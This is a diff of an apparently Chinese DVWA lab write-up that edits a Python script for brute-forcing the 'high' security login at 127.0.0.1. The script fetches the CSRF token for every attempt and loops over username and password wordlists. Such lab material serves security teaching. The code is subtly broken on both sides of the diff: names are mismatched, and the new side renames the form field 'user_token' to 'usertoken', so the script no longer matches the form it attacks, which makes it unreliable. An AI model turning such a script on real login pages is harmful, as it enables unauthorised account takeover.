@@ -141,7 +141,6 @@ if( $result && mysqli_num_rows( $result ) == 1 ) {
         sleep( rand( 0, 3 ) );
         echo "<pre><br />Username and/or password incorrect.</pre>";
     } ;
-
 ```
 
 
@@ -178,7 +177,7 @@ _我们必须找出这个usertoken的值是从哪里来的，规律是什么才�
 
 
 ```python
-_import requests
+import requests
 from bs4 import BeautifulSoup
 import sys
 
@@ -187,7 +186,7 @@ import sys
 #获取usertoken值
 header={
     'Host': '127.0.0.1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,__/_;q=0.8',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8',
     'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
     'Accept-Encoding': 'gzip, deflate',
     'Referer': 'http://127.0.0.1/dvwa/vulnerabilities/brute/',
@@ -195,14 +194,14 @@ header={
     'Cookie': 'security=high; PHPSESSID=mtsel2kcb1a4uecf6b7e87aa23',
 }
 
-def get_user_token():
+def getusertoken():
     # 获取DVWA登陆页面
     r = requests.get('http://127.0.0.1/dvwa/vulnerabilities/brute/',headers=header)
     rsp = r.text
 
     # 获取登陆表单中的value值
     soup = BeautifulSoup(rsp,'lxml')
-    input_name = soup.find(attrs={'name':'user__token'})
+    inputname = soup.find(attrs={'name':'usertoken'})
     value = inputname['value']
     return  value
 
@@ -211,32 +210,32 @@ def get_user_token():
 f1 = open('username.txt','r')
 userlist = f1.readlines()
 for i in range(0,len(userlist)):
-    user__list[i] = user__list[i].rstrip('\n')
+    userlist[i] = userlist[i].rstrip('\n')
 f1.close()
 
 f2 = open('password.txt','r')
 passlist = f2.readlines()
 for i in range(0,len(passlist)):
-    pass__list[i] = pass__list[i].rstrip('\n')
+    passlist[i] = passlist[i].rstrip('\n')
 f2.close()
 
 # value值即get请求头中的usertoken
 # 开始组合请求头并发送到服务器
 for username in userlist:
     for password in passlist:
-        payload = {'username':username,'password':password,'Login':'Login','user__token':get__usertoken()}
+        payload = {'username':username,'password':password,'Login':'Login','usertoken':getusertoken()}
         r = requests.get('http://127.0.0.1/dvwa/vulnerabilities/brute/',headers=header,params=payload)
         rsp = r.text
         #判断是否登陆成功
         try:
             soup = BeautifulSoup(rsp,'lxml')
             errortext= soup.find(soup.pre.br.string)
-            error__text = str(error__text)
+            errortext = str(errortext)
             if 'incorrect' in errortext:
                 print(username,password+'  '+'错误')
         except AttributeError:
             print(username,password+'  '+'正确')
-            sys.exit() #找到正确密码就退出程序，不在往下执行_
+            sys.exit() #找到正确密码就退出程序，不在往下执行
 
 ```
 
